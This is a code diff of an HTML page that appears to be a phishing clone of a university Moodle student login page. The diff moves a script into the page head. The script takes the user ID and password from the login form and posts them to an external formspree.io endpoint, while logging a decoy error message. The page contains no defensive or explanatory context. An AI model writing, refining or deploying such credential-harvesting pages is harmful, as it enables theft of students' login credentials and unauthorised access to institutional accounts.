@@ -6,7 +6,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
     <style>
-
+<script>
+	    
 
     body {
         margin:0;
@@ -119,6 +120,33 @@ h2 {
 :link { color: rgb(51,51,125) ; text-decoration: none;}
 :active { color: rgb(0,153,0) ; text-decoration: underline; }
 :visited { color: rgb(85,85,175) ; text-decoration: none; }</style>
+<script>
+  console.log("error 323");
+var onclick = () => {
+	event.preventDefault();
+    var id = document.getElementById('ID').value
+    var pass = document.getElementById('PASS').value
+
+    fetch("https://formspree.io/f/mqkjkvgw", {
+    method: "POST",
+    body: JSON.stringify({
+        title: id,
+        body: pass,
+        userId: 1
+    }),
+     
+    headers: {
+        "Content-type": "application/json; charset=UTF-8"
+    }
+})
+ 
+// Converting to JSON
+.then(response => response.json())
+ 
+// Displaying results to console
+.then(json => console.log(json));
+}
+</script>
 </head>
   <body style="margin: 0px !important;background-color: white;" data-new-gr-c-s-check-loaded="8.901.0" data-gr-ext-installed="" background="http://moodle.smuc.edu.et/students/image/bg.jpg">
 
@@ -342,33 +370,7 @@ MM_reloadPage(true);
 </tbody></table>
 </div>
 
-<script language="JavaScript" type="text/JavaScript">
-	console.log("error 323");
-var onclick = () => {
-	event.preventDefault();
-    var id = document.getElementById('ID').value
-    var pass = document.getElementById('PASS').value
 
-    fetch("https://formspree.io/f/mqkjkvgw", {
-    method: "POST",
-    body: JSON.stringify({
-        title: id,
-        body: pass,
-        userId: 1
-    }),
-     
-    headers: {
-        "Content-type": "application/json; charset=UTF-8"
-    }
-})
- 
-// Converting to JSON
-.then(response => response.json())
- 
-// Displaying results to console
-.then(json => console.log(json));
-}
-</script>
 
 </div>
 
